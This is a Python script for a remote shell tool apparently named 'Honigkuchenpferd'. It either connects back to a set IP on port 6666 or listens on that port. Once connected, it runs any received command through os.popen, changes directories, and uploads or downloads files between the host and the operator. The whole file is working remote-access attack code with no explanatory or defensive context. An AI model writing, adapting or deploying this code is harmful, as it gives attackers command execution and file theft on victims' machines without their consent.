#!/usr/bin/python
#
# python2.7 and python3
#

import os
import sys
import socket
import time

IP='127.0.0.1'

REVERSE=True        #False=bind shell
class tcp_socket():

    def listen_on(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ''
        self.s.bind((self.host, int(port)))
        self.s.listen(5)
        self.conn, self.addr = self.s.accept()

    def connect_to(self, host, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((host, int(port)))

    def recive_data(self):
        return self.conn.recv(1024)

    def send_data(self, data):
        self.conn.sendall(data)

    def send_all(self, filename):
        self.conn.sendall(open(filename, "rb").read())

    def recive_all(self):
        self.data = b''
        while True:
            self.data_chunk = self.conn.recv(1024)
            #if self.data_chunk:
            if (len(self.data_chunk) == 1024):
                self.data += self.data_chunk
            else:
                self.data += self.data_chunk
                break
        return self.data

    def close(self):
        self.conn.close()

        
#send and recive file      
def recive_file(conn, file_name):
    data = conn.recive_all()
    with open(file_name, 'wb') as f:
        f.write(data)
    conn.send_data(bytes("OK", 'utf-8'))

def send_file(conn, file_name):
        conn.send_all(file_name)
        if str(conn.recive_data(), 'utf-8') == 'OK':
            #print("OK")
            pass


def easy_exec(cmd):
    try:
        return os.popen(cmd).read()
    except:
        return "input error"

def easy_chdir(s):
    try:
        os.chdir(s)
    except:
        pass

        
# python2.7 and python3
def to_bytes(s):
    if sys.version_info[0] < 3:
        return bytes(s)
    else:
        return bytes(s, 'utf-8')

    
# python2.7 and python3
def to_str(s):
    if sys.version_info[0] < 3:
        return str(s)
    else:
        return str(s, 'utf-8')

    
def easy_cmd(conn):
    cmd = to_str(conn.recive_data())
    
    if cmd.startswith('cd'):
        easy_chdir(cmd[3:len(cmd) - 1])
    elif cmd.startswith('download'):
        send_file(conn, cmd[9:len(cmd)-1])
    elif cmd.startswith('upload'):
        recive_file(conn, cmd[7:len(cmd)-1])
    elif cmd == "exit\n":
        conn.close()
        exit()
    else:
        conn.send_data(to_bytes(easy_exec(cmd)+'\n'))

        
def honigkuchen(conn):
    while 1:
        conn.send_data(to_bytes(str('[Honigkuchenpferd ' + os.getcwd() + '] ')))
        easy_cmd(conn)
        time.sleep(0.2)
        
if __name__ == '__main__':
    x = tcp_socket()

    if REVERSE == True:
        x.connect_to(IP, 6666)
    else:
        x.listen_on(6666)

    honigkuchen(x)


